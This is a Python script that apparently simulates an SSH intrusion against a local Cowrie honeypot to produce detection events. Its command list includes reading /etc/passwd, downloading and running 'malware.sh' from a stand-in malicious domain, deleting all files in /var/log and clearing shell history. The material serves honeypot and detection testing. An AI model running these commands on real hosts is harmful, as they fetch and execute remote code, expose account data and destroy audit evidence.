import paramiko
import time
import random
import sys

HOSTNAME = "localhost"
PORT = 2222
USERNAME = "root"
PASSWORD = "password"  # Cowrie accepts random passwords often, or simple ones

# Commands to run after a successful login. Kept separate so the demo can be
# extended (e.g. a list that triggers the expanded MITRE rules).
COMMANDS = [
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious-domain.com/malware.sh",
    "chmod +x malware.sh",
    "./malware.sh",
    "rm -rf /var/log/*",
    "history -c",
]


def run_command(client, cmd):
    """Run one command on a Cowrie session and return its output.

    Two things make this reliable where the original hung/died:
    - `get_pty=True`: Cowrie emulates the interactive PTY shell path, which it
      handles far more robustly than a non-PTY exec channel.
    - A bounded wait (`recv_exit_status` + channel timeout) instead of a bare
      `stdout.read()`, which blocks forever if the channel closes early.
    """
    stdin, stdout, stderr = client.exec_command(cmd, get_pty=True, timeout=30)
    stdout.channel.settimeout(10)
    stdout.channel.recv_exit_status()  # waits for the command to finish
    try:
        output = stdout.read(4096).decode("utf-8", errors="replace")
    except Exception:
        output = ""
    if output.strip():
        print(f"    {output.strip()[:200]}")
    return output


def simulate_attack():
    print(f"[*] Starting attack simulation against {HOSTNAME}:{PORT}...")

    # Simulate a failed brute-force attempt
    print("[*] Attempting brute-force with incorrect credentials...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOSTNAME, port=PORT, username="admin", password="admin123", timeout=5)
        client.close()
    except Exception as e:
        print(f"[-] Brute-force attempt failed as expected: {e}")

    time.sleep(2)

    # Simulate a successful login
    print(f"[*] Attempting login with {USERNAME}:{PASSWORD}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(HOSTNAME, port=PORT, username=USERNAME, password=PASSWORD, timeout=5)
        print("[+] Login successful!")
        # Keepalive so an idle moment between commands can't drop the session.
        client.get_transport().set_keepalive(10)

        for cmd in COMMANDS:
            print(f"[*] Executing: {cmd}")
            # One failing command must not abort the rest of the run — the demo
            # needs as many events forwarded as possible.
            try:
                run_command(client, cmd)
            except Exception as e:
                print(f"    [!] Command failed (continuing): {e}")
            time.sleep(random.uniform(1, 3))

        print("[*] Attack simulation complete. Closing connection.")
        client.close()

    except Exception as e:
        print(f"[-] Error during attack simulation: {e}")
        sys.exit(1)


if __name__ == "__main__":
    simulate_attack()
